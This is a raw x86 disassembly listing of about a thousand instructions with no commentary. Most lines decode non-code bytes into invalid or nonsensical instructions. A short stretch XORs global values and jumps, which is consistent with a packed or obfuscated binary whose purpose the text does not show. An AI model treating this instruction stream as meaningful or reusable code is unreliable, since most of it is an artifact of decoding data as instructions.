  40ccc0:	stos   BYTE PTR es:[edi],al
  40ccc1:	int    0xcd
  40ccc3:	push   ds
  40ccc4:	(bad)  
  40ccc5:	pop    ecx
  40ccc6:	nop
  40ccc7:	adc    ebp,DWORD PTR [ebp+0x736e659c]
  40cccd:	lods   al,BYTE PTR ds:[esi]
  40ccce:	dec    ebx
  40cccf:	out    dx,eax
  40ccd0:	mov    eax,0xdbb797ab
  40ccd5:	and    ebp,DWORD PTR [esi+esi*2-0x12453b61]
  40ccdc:	push   ebx
  40ccdd:	iret   
  40ccde:	cli    
  40ccdf:	call   0x11aa8541
  40cce4:	stos   DWORD PTR es:[edi],eax
  40cce5:	jge    0x40cd2b
  40cce7:	mov    dh,0x98
  40cce9:	adc    BYTE PTR [ecx],ch
  40cceb:	test   al,0xc9
  40cced:	pusha  
  40ccee:	test   al,bl
  40ccf0:	jae    0x40ccee
  40ccf2:	add    BYTE PTR [ebp-0x70239853],dl
  40ccf8:	fsubr  DWORD PTR [ebx]
  40ccfa:	adc    ch,BYTE PTR [edx]
  40ccfc:	jno    0x40cd61
  40ccfe:	jmp    0x4d12:0xf7373441
  40cd05:	fldenv [edi]
  40cd07:	push   ds
  40cd08:	scas   eax,DWORD PTR es:[edi]
  40cd09:	dec    esi
  40cd0a:	outs   dx,BYTE PTR ds:[esi]
  40cd0b:	mov    bh,bh
  40cd0d:	out    dx,eax
  40cd0e:	jmp    0x40cd41
  40cd10:	cdq    
  40cd11:	adc    eax,0xcd15fe5c
  40cd16:	inc    ebx
  40cd17:	adc    cl,dh
  40cd19:	mov    bh,0xe5
  40cd1b:	pop    ebx
  40cd1c:	and    ecx,DWORD PTR [esi-0x62c4f4d7]
  40cd22:	(bad)  
  40cd23:	bnd jl 0x40cd6b
  40cd26:	cmp    esi,DWORD PTR [ebp+0x19]
  40cd29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd2a:	or     BYTE PTR [esp+esi*1+0xa13cd0],ch
  40cd31:	sbb    BYTE PTR [edi-0x5a],ah
  40cd34:	sub    ah,dl
  40cd36:	xchg   BYTE PTR [esi],dl
  40cd38:	cmp    BYTE PTR [ebx-0x7c4e755d],ch
  40cd3e:	and    eax,0xa287b3
  40cd43:	stc    
  40cd44:	xchg   edx,eax
  40cd45:	adc    ebx,edx
  40cd47:	fild   WORD PTR [ebx]
  40cd49:	jae    0x40ccef
  40cd4b:	jecxz  0x40cd7d
  40cd4d:	inc    edx
  40cd4e:	push   es
  40cd4f:	and    eax,0xd005a29d
  40cd54:	mov    ebx,0xde04885e
  40cd59:	pushf  
  40cd5a:	mov    cl,BYTE PTR [edx]
  40cd5c:	mov    dl,0xd
  40cd5e:	pop    esp
  40cd5f:	adc    DWORD PTR [edx+0x64],ebx
  40cd62:	fwait
  40cd63:	mov    ebx,0xabf0b29b
  40cd68:	xor    al,0xf0
  40cd6a:	sub    eax,0x1746860b
  40cd6f:	cdq    
  40cd70:	icebp  
  40cd71:	gs daa 
  40cd73:	or     eax,0x4e63e2ac
  40cd78:	fnstcw WORD PTR [edi+0x538b6d34]
  40cd7e:	das    
  40cd7f:	fist   WORD PTR [esp+ebx*2+0x42]
  40cd83:	xor    eax,DWORD PTR [ebx+edx*4]
  40cd86:	mov    ah,0x43
  40cd88:	cmp    edx,eax
  40cd8a:	jmp    FWORD PTR [eax+0xe]
  40cd8d:	mov    ecx,0xcf2bad79
  40cd92:	clc    
  40cd93:	sbb    cl,dh
  40cd95:	cld    
  40cd96:	cdq    
  40cd97:	jp     0x40cd24
  40cd99:	bound  ebx,QWORD PTR [ebp+eax*8+0x57b64943]
  40cda0:	jmp    0x40cdd4
  40cda2:	(bad)  
  40cda3:	js     0x40cda4
  40cda5:	cmp    BYTE PTR [ebx+edx*1],bh
  40cda8:	pop    es
  40cda9:	inc    ebx
  40cdaa:	mov    edi,0xa4616001
  40cdaf:	mov    cl,0x2b
  40cdb1:	cmp    esi,DWORD PTR [ecx-0x34]
  40cdb4:	pop    edi
  40cdb5:	ins    DWORD PTR es:[edi],dx
  40cdb6:	adc    DWORD PTR [esi+0x46670b8a],ebp
  40cdbc:	jg     0x40cda6
  40cdbe:	adc    DWORD PTR [ecx],esi
  40cdc0:	rol    ebp,cl
  40cdc2:	outs   dx,BYTE PTR ds:[esi]
  40cdc3:	xchg   BYTE PTR [edx],dl
  40cdc5:	ins    DWORD PTR es:[edi],dx
  40cdc6:	push   eax
  40cdc7:	jae    0x40cd6a
  40cdc9:	ins    DWORD PTR es:[edi],dx
  40cdca:	(bad)  
  40cdcc:	adc    esi,DWORD PTR [edi+ebp*8]
  40cdcf:	adc    BYTE PTR [ebx+0x29ed69ad],dh
  40cdd5:	fwait
  40cdd6:	sbb    al,0x9f
  40cdd8:	cwde   
  40cdd9:	mov    dh,0xf9
  40cddb:	test   eax,0xa38e3817
  40cde0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cde1:	icebp  
  40cde2:	sub    eax,0x7e10d543
  40cde7:	xchg   ecx,eax
  40cde8:	xchg   ebp,eax
  40cde9:	pop    ecx
  40cdea:	push   ebp
  40cdeb:	inc    edi
  40cdec:	jge    0x40cdf6
  40cdee:	pusha  
  40cdef:	add    ah,BYTE PTR [ebp+0x2db35692]
  40cdf5:	scas   eax,DWORD PTR es:[edi]
  40cdf6:	pop    ss
  40cdf7:	xchg   ebp,eax
  40cdf8:	mov    BYTE PTR [ecx],dh
  40cdfa:	aam    0x3c
  40cdfc:	scas   eax,DWORD PTR es:[edi]
  40cdfd:	int3   
  40cdfe:	dec    esp
  40cdff:	daa    
  40ce00:	rcr    DWORD PTR [ebp-0xb],0x97
  40ce04:	and    DWORD PTR [ebx-0x76],edx
  40ce07:	cmp    DWORD PTR [ecx],edi
  40ce09:	sbb    eax,0x62b98efe
  40ce0e:	cli    
  40ce0f:	scas   eax,DWORD PTR es:[edi]
  40ce10:	add    al,0x31
  40ce12:	in     al,0xef
  40ce14:	aas    
  40ce15:	std    
  40ce16:	cwde   
  40ce17:	mov    esi,0xdd4624d6
  40ce1c:	add    eax,0x486c2c20
  40ce21:	in     al,dx
  40ce22:	out    dx,al
  40ce23:	outs   dx,BYTE PTR ds:[esi]
  40ce24:	ins    BYTE PTR es:[edi],dx
  40ce25:	mov    bl,0x34
  40ce27:	adc    DWORD PTR [edi],ecx
  40ce29:	inc    edi
  40ce2a:	retf   0xf98d
  40ce2d:	dec    edi
  40ce2e:	(bad)  
  40ce2f:	das    
  40ce30:	test   al,0xe5
  40ce32:	xor    al,0xf
  40ce34:	push   ds
  40ce35:	test   al,0xf3
  40ce37:	push   esi
  40ce38:	in     al,0xd0
  40ce3a:	popa   
  40ce3b:	and    DWORD PTR [edi-0x71474fbf],ebx
  40ce41:	repz in al,dx
  40ce43:	mov    BYTE PTR [ebx],al
  40ce45:	cs jno 0x40cea6
  40ce48:	pop    ds
  40ce49:	(bad)  
  40ce4b:	dec    edx
  40ce4c:	mov    bl,0x94
  40ce4e:	bound  ecx,QWORD PTR [ebp-0xaf18cb9]
  40ce54:	outs   dx,BYTE PTR ds:[esi]
  40ce55:	jmp    0x7f5d:0x9264c1df
  40ce5c:	aam    0x8c
  40ce5e:	ror    BYTE PTR [edx],cl
  40ce60:	sub    al,0xa5
  40ce62:	pop    eax
  40ce63:	inc    esp
  40ce64:	pop    ecx
  40ce65:	xor    DWORD PTR [edx+0x1a35e244],ecx
  40ce6b:	mov    al,0x82
  40ce6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce6e:	inc    DWORD PTR [esi-0x1f5e1af7]
  40ce74:	cmp    BYTE PTR [ecx+0x62],dl
  40ce77:	mov    ds:0x61d86a6c,al
  40ce7c:	or     ebp,DWORD PTR [esi]
  40ce7e:	push   es
  40ce7f:	cwde   
  40ce80:	fidiv  WORD PTR [ebx-0x3d4d27d6]
  40ce86:	fld    QWORD PTR ds:0xd0e9312e
  40ce8c:	mov    edx,0x445e16fc
  40ce91:	jmp    0xc5f1d622
  40ce96:	aad    0x81
  40ce98:	lds    eax,FWORD PTR [ebp*2-0x3eeeedbe]
  40ce9f:	cmp    DWORD PTR [eax-0x39],esp
  40cea2:	mov    dl,al
  40cea4:	(bad)  
  40cea5:	mov    ch,0x57
  40cea7:	retf   0xff18
  40ceaa:	push   edi
  40ceab:	or     DWORD PTR [eax+esi*2],ebx
  40ceae:	mov    ebp,0x9a717293
  40ceb3:	adc    DWORD PTR [esi],esp
  40ceb5:	mov    edi,0x35b19655
  40ceba:	call   0x5019:0x387dbfe
  40cec1:	lock xchg edx,eax
  40cec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cec4:	int    0x29
  40cec6:	out    0x82,al
  40cec8:	and    esi,DWORD PTR [edi]
  40ceca:	ins    DWORD PTR es:[edi],dx
  40cecb:	(bad)  
  40cecd:	xchg   BYTE PTR [edx+0x25],ah
  40ced0:	(bad)  
  40ced1:	xchg   edx,eax
  40ced2:	mov    dh,0xf1
  40ced4:	xchg   ebp,eax
  40ced5:	and    eax,edx
  40ced7:	in     eax,0xf4
  40ced9:	ins    DWORD PTR es:[edi],dx
  40ceda:	jmp    DWORD PTR [esi]
  40cedc:	adc    DWORD PTR [ecx-0x3b],esi
  40cedf:	mov    al,ds:0xc8281e1c
  40cee4:	(bad)  
  40cee5:	jno    0x40ceab
  40cee7:	(bad)  
  40cee8:	lods   eax,DWORD PTR ds:[esi]
  40cee9:	pop    edi
  40ceea:	clc    
  40ceeb:	cmc    
  40ceec:	jp     0x40ce85
  40ceee:	add    DWORD PTR [edi+0x50c0e524],edx
  40cef4:	and    dl,BYTE PTR [edi-0x76e775e7]
  40cefa:	pushf  
  40cefb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cefc:	hlt    
  40cefd:	xchg   ebp,eax
  40cefe:	adc    eax,0x8681cba7
  40cf03:	mov    cl,bh
  40cf05:	and    BYTE PTR [ebx-0x3034ed44],0x3d
  40cf0c:	add    al,bl
  40cf0e:	jns    0x40cedb
  40cf10:	loope  0x40cf59
  40cf12:	dec    ebp
  40cf13:	add    al,ch
  40cf15:	das    
  40cf16:	xchg   edx,eax
  40cf17:	inc    ebp
  40cf18:	sub    al,0x89
  40cf1a:	cs xchg esi,eax
  40cf1c:	cmp    eax,0x918d66ec
  40cf21:	sar    DWORD PTR [ebp+0x1919d4b1],0xbb
  40cf28:	sub    edi,esp
  40cf2a:	and    eax,0xf51a73e2
  40cf2f:	out    dx,eax
  40cf30:	inc    edx
  40cf31:	mov    ah,0x7a
  40cf33:	add    DWORD PTR [edx],ecx
  40cf35:	sbb    BYTE PTR [edi-0x26],ch
  40cf38:	add    DWORD PTR [eax],ebp
  40cf3a:	mov    edi,0xc60f21d5
  40cf3f:	add    dl,dl
  40cf41:	ret    
  40cf42:	and    bh,0x73
  40cf45:	cli    
  40cf46:	xor    al,0x77
  40cf48:	adc    al,0x40
  40cf4a:	dec    esi
  40cf4b:	push   edi
  40cf4c:	mov    eax,0xddb85d2c
  40cf51:	mov    WORD PTR [edi+0x4d7dcbfc],?
  40cf57:	jmp    0x5115ec56
  40cf5c:	adc    eax,0x86780783
  40cf61:	jmp    0xb75f374b
  40cf66:	jge    0x40cfd9
  40cf68:	jbe    0x40cfc8
  40cf6a:	neg    DWORD PTR [ebx+0x70319208]
  40cf70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf71:	adc    ebp,DWORD PTR [ebx]
  40cf73:	dec    eax
  40cf74:	iret   
  40cf75:	xchg   ebp,eax
  40cf76:	out    dx,eax
  40cf77:	test   DWORD PTR [ebx],ecx
  40cf79:	imul   esi,DWORD PTR [edx*4+0x46caea92],0xffffffb3
  40cf81:	or     eax,0x359b094
  40cf86:	mov    WORD PTR [edx+0x5e],gs
  40cf89:	cs in  al,dx
  40cf8b:	xchg   esi,eax
  40cf8c:	int    0xc1
  40cf8e:	inc    edi
  40cf8f:	sbb    esi,DWORD PTR [ebx+0x58]
  40cf92:	xchg   BYTE PTR [ecx-0x3],bl
  40cf95:	repz pop esi
  40cf97:	jle    0x40cf5a
  40cf99:	push   cs
  40cf9a:	mov    dl,0xcb
  40cf9c:	div    DWORD PTR [ecx+0x6bc4bc25]
  40cfa2:	and    bh,BYTE PTR [esi-0x2c581e62]
  40cfa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfa9:	cmc    
  40cfaa:	push   cs
  40cfab:	shr    DWORD PTR [ebx],1
  40cfad:	icebp  
  40cfae:	or     esi,DWORD PTR [ebp-0x3e54661d]
  40cfb4:	xchg   esi,eax
  40cfb5:	aaa    
  40cfb6:	pop    esp
  40cfb7:	and    dh,al
  40cfb9:	shr    DWORD PTR gs:[eax+0x69],cl
  40cfbd:	fnstcw WORD PTR [eax]
  40cfbf:	mov    edx,0x5c3eed5f
  40cfc4:	(bad)  
  40cfc5:	cld    
  40cfc6:	cmp    eax,0x201071f1
  40cfcb:	icebp  
  40cfcc:	lock fnstcw WORD PTR [edx]
  40cfcf:	loop   0x40cfb9
  40cfd1:	dec    ecx
  40cfd2:	push   edi
  40cfd3:	mov    esp,0xcfb59b6f
  40cfd8:	add    DWORD PTR [esi-0x4c],esp
  40cfdb:	imul   esi,DWORD PTR [edi+eiz*2-0x2804518f],0x2c
  40cfe3:	aaa    
  40cfe4:	pushf  
  40cfe5:	out    0x7a,al
  40cfe7:	xor    bh,BYTE PTR [ecx-0x5c]
  40cfea:	cmp    eax,0x58228cea
  40cfef:	mov    al,ds:0xfbb89ef0
  40cff4:	(bad)
  40cff7:	into   
  40cff8:	fwait
  40cff9:	test   BYTE PTR ss:[edx],al
  40cffc:	adc    dh,cl
  40cffe:	jnp    0x40cfed
  40d000:	pop    ss
  40d001:	xor    al,0xba
  40d003:	xchg   edi,eax
  40d004:	popf   
  40d005:	cdq    
  40d006:	cmp    bh,BYTE PTR [esi+0x4a]
  40d009:	mul    esi
  40d00b:	rcl    DWORD PTR [ebx],1
  40d00d:	repnz mov edx,0x233a482f
  40d013:	(bad)  
  40d014:	ins    DWORD PTR es:[edi],dx
  40d015:	jmp    0x40d05c
  40d017:	inc    edx
  40d018:	fcmovnu st,st(4)
  40d01a:	jno    0x40cffb
  40d01c:	sub    DWORD PTR [ebp+0x45e2d28a],ebx
  40d022:	sbb    DWORD PTR ss:[ebp+0x38],edx
  40d026:	outs   dx,BYTE PTR ds:[esi]
  40d027:	sbb    BYTE PTR [eax],0x54
  40d02a:	xchg   ecx,eax
  40d02b:	retf   
  40d02c:	mov    ebp,es
  40d02e:	jnp    0x40d03f
  40d030:	push   esp
  40d031:	adc    BYTE PTR [eax+eiz*4+0x72],bl
  40d035:	outs   dx,DWORD PTR ds:[esi]
  40d036:	mov    esp,0x2102988c
  40d03b:	div    cl
  40d03d:	lds    eax,FWORD PTR [ecx+0x2e4303a]
  40d043:	fld    TBYTE PTR [edx-0x5e]
  40d046:	adc    DWORD PTR [ebp+eiz*2+0x3143c5b4],edx
  40d04d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d04e:	aad    0xdf
  40d050:	adc    al,dh
  40d052:	das    
  40d053:	int3   
  40d054:	xor    BYTE PTR [ebx-0x54dd113a],bl
  40d05a:	jl     0x40d021
  40d05c:	sub    DWORD PTR [ebx-0x6f],ebx
  40d05f:	pop    ebx
  40d060:	or     ah,bl
  40d062:	dec    ecx
  40d063:	jge    0x40d02d
  40d065:	pop    esp
  40d066:	adc    eax,0xc00fa916
  40d06b:	mov    ch,0x6b
  40d06d:	or     ebx,DWORD PTR [esi-0x44e5cb1e]
  40d073:	cmp    eax,0x30029d96
  40d078:	jne    0x40d079
  40d07a:	mov    edx,0x29a2caa3
  40d07f:	test   BYTE PTR [ebx],bh
  40d081:	mov    DWORD PTR [ecx+eax*1],eax
  40d084:	shl    DWORD PTR [esi],cl
  40d086:	push   ds
  40d087:	push   edi
  40d088:	not    BYTE PTR [ebp-0x53]
  40d08b:	int3   
  40d08c:	mov    ch,0x53
  40d08e:	sar    DWORD PTR fs:[edi],1
  40d091:	std    
  40d092:	inc    eax
  40d093:	cwde   
  40d094:	popf   
  40d095:	adc    BYTE PTR [ebx+esi*1-0xa],bh
  40d099:	or     dl,bh
  40d09b:	jle    0x40d0ca
  40d09d:	ja     0x40d08e
  40d09f:	dec    esp
  40d0a0:	cmp    al,0x17
  40d0a2:	and    al,0xa7
  40d0a4:	sar    DWORD PTR [esi+esi*8+0x3c065a9e],0x87
  40d0ac:	cmc    
  40d0ad:	lods   al,BYTE PTR ds:[esi]
  40d0ae:	pop    ecx
  40d0af:	mov    al,0x60
  40d0b1:	loope  0x40d100
  40d0b3:	ror    DWORD PTR [ebp-0x62],1
  40d0b6:	mov    BYTE PTR [edx+0x7af22d29],0xb5
  40d0bd:	mov    edi,0xd8e70995
  40d0c2:	sbb    DWORD PTR [ecx],ecx
  40d0c4:	pushf  
  40d0c5:	sbb    ah,ch
  40d0c7:	mov    ebx,0xa248827
  40d0cc:	inc    ecx
  40d0cd:	push   esp
  40d0ce:	scas   eax,DWORD PTR es:[edi]
  40d0cf:	pop    edx
  40d0d0:	mov    ah,0x77
  40d0d2:	mov    ah,0x5c
  40d0d4:	retf   0x948d
  40d0d7:	cdq    
  40d0d8:	xor    eax,esi
  40d0da:	xor    DWORD PTR ds:0x42a296,0x42a2e6
  40d0e4:	add    eax,edi
  40d0e6:	mov    DWORD PTR ds:0x42a2ce,0x1ae8
  40d0f0:	cmp    ecx,eax
  40d0f2:	je     0x413d1d
  40d0f8:	xor    DWORD PTR ds:0x42a26e,0x42a2e6
  40d102:	push   DWORD PTR [ebp-0x14]
  40d105:	push   DWORD PTR [ebp+0x8]
  40d108:	call   0x4250bf
  40d10d:	sub    DWORD PTR ds:0x42a266,edi
  40d113:	jmp    0x40f48f
  40d118:	scas   eax,DWORD PTR es:[edi]
  40d119:	cdq    
  40d11a:	and    DWORD PTR [ebx],edx
  40d11c:	add    DWORD PTR [ebx+0x10ba9981],ecx
  40d122:	cwde   
  40d123:	int    0x96
  40d125:	rcl    BYTE PTR [ebp+ecx*2-0x2e],0xcc
  40d12a:	add    DWORD PTR [ebx-0x7c7ca1de],0x38
  40d131:	and    DWORD PTR [edx-0x2cbc358e],edi
  40d137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d138:	pop    ebx
  40d139:	xchg   ebp,eax
  40d13a:	xchg   ebp,eax
  40d13b:	pop    ebx
  40d13c:	sbb    al,0xda
  40d13e:	push   es
  40d13f:	pop    ecx
  40d140:	int    0x80
  40d142:	test   BYTE PTR [eax],0xc3
  40d145:	jbe    0x40d19f
  40d147:	dec    ebp
  40d148:	dec    eax
  40d149:	mov    eax,ds:0xbe343c9d
  40d14e:	mov    ch,0x7e
  40d150:	fcmovu st,st(0)
  40d152:	pop    esi
  40d153:	or     ebp,eax
  40d155:	mov    ecx,0xa1a92f8
  40d15a:	iret   
  40d15b:	jne    0x40d174
  40d15d:	add    ecx,DWORD PTR [edx]
  40d15f:	mov    edx,0x83ef72ab
  40d164:	jno    0x40d18c
  40d166:	outs   dx,DWORD PTR ds:[esi]
  40d167:	enter  0xda79,0xfe
  40d16b:	jp     0x40d1ba
  40d16d:	pop    ecx
  40d16e:	inc    edx
  40d16f:	cmp    BYTE PTR [edi+0x31],al
  40d172:	push   0x9515f6ef
  40d177:	jne    0x40d17e
  40d179:	daa    
  40d17a:	push   esp
  40d17b:	lock pusha 
  40d17d:	push   0x764f4fb2
  40d182:	sar    BYTE PTR [edi-0x52],cl
  40d185:	inc    eax
  40d186:	in     al,dx
  40d187:	mov    ds:0x2ec8fc94,al
  40d18c:	xchg   ecx,eax
  40d18d:	xchg   edi,eax
  40d18e:	xor    edi,DWORD PTR [ebp-0x7c8068d6]
  40d194:	push   cs
  40d195:	dec    esi
  40d196:	xchg   esi,eax
  40d197:	fdivr  st,st(0)
  40d199:	adc    eax,0x5ddc5f93
  40d19e:	loopne 0x40d1b9
  40d1a0:	mov    esi,0xd7f06a1b
  40d1a5:	push   ecx
  40d1a6:	cmp    ebp,0xacca1b15
  40d1ac:	aaa    
  40d1ad:	lahf   
  40d1ae:	sbb    al,0xdc
  40d1b0:	in     al,0xb8
  40d1b2:	jb     0x40d1c2
  40d1b4:	sub    eax,0xd7d7b1a6
  40d1b9:	add    BYTE PTR [ecx+0x590a859],cl
  40d1bf:	inc    ecx
  40d1c0:	jecxz  0x40d20f
  40d1c2:	jo     0x40d186
  40d1c4:	or     al,BYTE PTR [ebx]
  40d1c6:	cmp    ebx,edi
  40d1c8:	inc    edx
  40d1c9:	sub    al,BYTE PTR [edi]
  40d1cb:	retf   0x7b3d
  40d1ce:	mov    esi,0xecfaf156
  40d1d3:	pop    esp
  40d1d4:	int    0x2b
  40d1d6:	pop    edi
  40d1d7:	fs ret 
  40d1d9:	push   ebx
  40d1da:	sub    esi,esp
  40d1dc:	jo     0x40d179
  40d1de:	scas   eax,DWORD PTR es:[edi]
  40d1df:	mov    ecx,0x3209a8b5
  40d1e4:	jne    0x40d250
  40d1e6:	call   0x8266f29
  40d1eb:	cdq    
  40d1ec:	ds gs push esi
  40d1ef:	xor    eax,0x91926042
  40d1f4:	pop    ebp
  40d1f5:	jg     0x40d23f
  40d1f7:	and    eax,0x812c3d7c
  40d1fc:	jb     0x40d199
  40d1fe:	xchg   al,cl
  40d200:	outs   dx,DWORD PTR ds:[esi]
  40d201:	rol    esp,0x4a
  40d204:	lods   al,BYTE PTR ds:[esi]
  40d205:	adc    eax,0x5071a843
  40d20a:	bound  edx,QWORD PTR ds:0xb72df1d4
  40d210:	addr16 cdq 
  40d212:	mov    ah,BYTE PTR ds:0xdcf6b2af
  40d218:	mov    esi,0x17ef8f56
  40d21d:	gs xor esp,ebx
  40d220:	imul   edi,DWORD PTR [ebx],0xffffffc2
  40d223:	mov    ebp,0xc6dd76d8
  40d228:	push   esp
  40d229:	pushf  
  40d22a:	mov    esp,0x9a4e3a46
  40d22f:	and    al,0xfe
  40d231:	pop    ecx
  40d232:	jle    0x40d217
  40d234:	sub    ah,BYTE PTR [edx]
  40d236:	mov    edx,0x64641419
  40d23b:	outs   dx,BYTE PTR ds:[esi]
  40d23c:	jmp    0xb047:0x9c0f0197
  40d243:	push   ss
  40d244:	xor    BYTE PTR [eax+0x62c894d8],cl
  40d24a:	push   esi
  40d24b:	dec    esp
  40d24c:	mov    ds:0x5a7cd567,eax
  40d251:	iret   
  40d252:	lods   al,BYTE PTR ds:[esi]
  40d253:	inc    ecx
  40d254:	push   ecx
  40d255:	and    ebx,edi
  40d257:	ffreep st(6)
  40d259:	and    DWORD PTR [ebx],ebx
  40d25b:	pop    esi
  40d25c:	xchg   ah,bl
  40d25e:	jnp    0x40d237
  40d260:	inc    edi
  40d261:	ror    DWORD PTR [esp+ebx*1+0x56b83f82],cl
  40d268:	ins    BYTE PTR es:[edi],dx
  40d269:	dec    esi
  40d26a:	popa   
  40d26b:	cs fwait
  40d26d:	xchg   ecx,edx
  40d26f:	and    ebp,DWORD PTR [edx+0x5115f4e6]
  40d275:	ret    0xa900
  40d278:	syscall 
  40d27a:	into   
  40d27b:	(bad)  
  40d27c:	(bad)  
  40d27d:	fld    QWORD PTR [esi-0x72]
  40d280:	jno    0x40d2a6
  40d282:	xchg   edx,eax
  40d283:	pushf  
  40d284:	inc    edx
  40d285:	adc    esi,ebp
  40d287:	arpl   dx,bp
  40d289:	mov    ebp,0x3f3c3191
  40d28e:	add    eax,0xc624cf56
  40d293:	mov    dh,0x5
  40d295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d296:	les    eax,FWORD PTR [ecx-0x7389bb9b]
  40d29c:	sub    eax,DWORD PTR [edx]
  40d29e:	jns    0x40d24d
  40d2a0:	lahf   
  40d2a1:	cmp    ah,ah
  40d2a3:	hlt    
  40d2a4:	inc    edi
  40d2a5:	xor    ebp,DWORD PTR [edx+0x34]
  40d2a8:	adc    al,0x6a
  40d2aa:	pusha  
  40d2ab:	das    
  40d2ac:	add    al,0xe7
  40d2ae:	dec    ebp
  40d2af:	jmp    0x47b02502
  40d2b4:	xor    BYTE PTR [esi+0x54],al
  40d2b7:	inc    esp
  40d2b8:	stc    
  40d2b9:	cmp    edi,DWORD PTR [esi+0x33]
  40d2bc:	shl    BYTE PTR [eax+eax*8-0x78],1
  40d2c0:	mov    cl,0x24
  40d2c2:	pushf  
  40d2c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2c4:	(bad)  
  40d2c5:	jnp    0x40d2c9
  40d2c7:	inc    ebx
  40d2c8:	fdiv   QWORD PTR [ebx-0x29]
  40d2cb:	jp     0x40d2e3
  40d2cd:	dec    esp
  40d2ce:	mov    ds,WORD PTR [edi+ebp*2]
  40d2d1:	mov    cl,0x39
  40d2d3:	fisub  DWORD PTR [esi-0x55e6ee07]
  40d2d9:	sub    DWORD PTR [ecx-0x315c7632],0x2f079531
  40d2e3:	hlt    
  40d2e4:	(bad)  
  40d2e5:	jp     0x40d2d8
  40d2e7:	pop    esi
  40d2e8:	test   eax,0xcc2cca67
  40d2ed:	pop    es
  40d2ee:	mov    bl,0x9a
  40d2f0:	call   0xfb291c3e
  40d2f5:	cmp    eax,0xc8eeb2a9
  40d2fa:	ins    DWORD PTR es:[edi],dx
  40d2fb:	je     0x40d310
  40d2fd:	enter  0x84af,0xb6
  40d301:	add    DWORD PTR [ecx-0x41],ebp
  40d304:	jmp    0x7ffa:0xa326a44
  40d30b:	mov    al,0x4e
  40d30d:	das    
  40d30e:	sbb    eax,0x11cac4c6
  40d313:	adc    BYTE PTR [edi],cl
  40d315:	adc    DWORD PTR [ebx+ecx*1+0x19129c6c],ebp
  40d31c:	pop    ss
  40d31d:	add    al,0x40
  40d31f:	inc    edx
  40d320:	xchg   BYTE PTR ds:0x2f17b90,al
  40d326:	push   es
  40d327:	jae    0x40d365
  40d329:	retf   
  40d32a:	mov    ch,0x23
  40d32c:	push   eax
  40d32d:	inc    ebp
  40d32e:	add    DWORD PTR [ebx],ebp
  40d330:	(bad)  
  40d331:	(bad)  
  40d332:	cmp    ebp,eax
  40d334:	jno    0x40d316
  40d336:	int    0xa8
  40d338:	das    
  40d339:	push   esp
  40d33a:	not    DWORD PTR [ecx+ebp*2+0x3f3cc4f2]
  40d341:	sbb    eax,0xaa671598
  40d346:	adc    eax,0x6a79dacf
  40d34b:	inc    edx
  40d34c:	in     al,0xfa
  40d34e:	arpl   ax,bx
  40d350:	xor    bh,BYTE PTR [edi+0x62b9fd98]
  40d356:	mov    ebx,0x76287c9c
  40d35b:	sar    al,cl
  40d35d:	imul   esp,DWORD PTR [eax],0x65
  40d360:	xor    esi,0x4f525b9a
  40d366:	sbb    dl,cl
  40d368:	jnp    0x40d35e
  40d36a:	mov    ebp,0x98adb2ef
  40d36f:	fdiv   QWORD PTR [eax]
  40d371:	sub    al,0xf4
  40d373:	push   ss
  40d374:	xchg   ecx,eax
  40d375:	hlt    
  40d376:	adc    eax,0xa525de1f
  40d37b:	mov    bl,0xde
  40d37d:	retf   
  40d37e:	push   es
  40d37f:	aas    
  40d380:	popa   
  40d381:	inc    edi
  40d382:	jmp    0xb6afcb2d
  40d387:	ror    BYTE PTR [eax+0x32da5cb8],1
  40d38d:	(bad)  
  40d38e:	call   0x2207:0x80fd6e03
  40d395:	ret    
  40d396:	out    dx,eax
  40d397:	retf   
  40d398:	add    edi,ebp
  40d39a:	and    al,0xc5
  40d39c:	add    ah,0x1e
  40d39f:	mov    ds:0xe9f494a9,al
  40d3a4:	sub    al,BYTE PTR [ebx]
  40d3a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3a7:	fwait
  40d3a8:	push   esp
  40d3a9:	or     al,0x25
  40d3ab:	test   al,0x73
  40d3ad:	popf   
  40d3ae:	cmp    ch,BYTE PTR [eax-0x24]
  40d3b1:	int3   
  40d3b2:	mov    ebx,0x7e1deb4f
  40d3b7:	xchg   esi,eax
  40d3b8:	aas    
  40d3b9:	adc    al,0xa7
  40d3bb:	mov    bh,BYTE PTR [esi-0x3af4eced]
  40d3c1:	jnp    0x40d438
  40d3c3:	push   edi
  40d3c4:	push   0x43f7b60c
  40d3c9:	stos   BYTE PTR es:[edi],al
  40d3ca:	sahf   
  40d3cb:	jmp    0xc373:0x8c97cf49
  40d3d2:	push   0x46df515a
  40d3d7:	sar    DWORD PTR [ecx-0x7a],0x49
  40d3db:	jne    0x40d432
  40d3dd:	pop    eax
  40d3de:	cmp    BYTE PTR ds:0xcf82b258,0x98
  40d3e5:	outs   dx,DWORD PTR ds:[esi]
  40d3e6:	push   edi
  40d3e7:	imul   ecx,ebx,0x4a
  40d3ea:	dec    esi
  40d3eb:	sbb    eax,0x7fa8a0b4
  40d3f0:	dec    esp
  40d3f1:	iret   
  40d3f2:	or     DWORD PTR [ebp-0x7],ebx
  40d3f5:	hlt    
  40d3f6:	xchg   ecx,eax
  40d3f7:	fsub   QWORD PTR ss:[ebp+0x27be2bb3]
  40d3fe:	cmp    al,0xed
  40d400:	inc    esp
  40d401:	or     dl,BYTE PTR [edi-0x67a3880e]
  40d407:	adc    ah,BYTE PTR [esi]
  40d409:	sar    al,0x61
  40d40c:	mov    ch,0xb
  40d40e:	or     al,0x13
  40d410:	dec    edi
  40d411:	cli    
  40d412:	and    DWORD PTR [ebx],ebx
  40d414:	lahf   
  40d415:	mov    cl,0x18
  40d417:	scas   eax,DWORD PTR es:[edi]
  40d418:	outs   dx,BYTE PTR ds:[esi]
  40d419:	aad    0x23
  40d41b:	xchg   edi,eax
  40d41c:	push   esi
  40d41d:	in     al,dx
  40d41e:	inc    ecx
  40d41f:	rol    ebx,1
